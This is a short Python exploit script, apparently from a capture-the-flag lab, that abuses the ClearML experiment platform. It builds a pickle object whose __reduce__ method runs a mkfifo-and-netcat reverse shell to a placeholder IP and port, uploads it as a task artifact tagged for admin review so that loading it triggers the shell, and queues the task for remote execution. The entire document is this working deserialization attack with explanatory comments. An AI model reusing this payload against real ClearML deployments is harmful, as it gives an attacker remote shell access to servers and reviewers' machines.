import os
from clearml import Task
import base64
import time
#Create a task in the Black Swan project, you need to tag the task so the admin review it and trigger you reverse shell
task = Task.init(project_name='Black Swan', task_name='Generate and Upload Pickle', tags=["review"], task_type=Task.TaskTypes.data_processing)

#This is a class where you are using the __reduce__ function from the pickle lib. It return your reverse shell
class Pickle:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f"
        return os.system, (cmd,)

#This line is juste to have a fancy base64 encoded upload name
rng_name = base64.b64encode(str(time.time()).encode()).decode()

#This is where you upload you revershell, passing the class in the object
task.upload_artifact(name=rng_name, artifact_object=Pickle())

#This line is there just to say to the system to continue the process remotly. So the jippity admin review your code
task.execute_remotely(queue_name='default')```
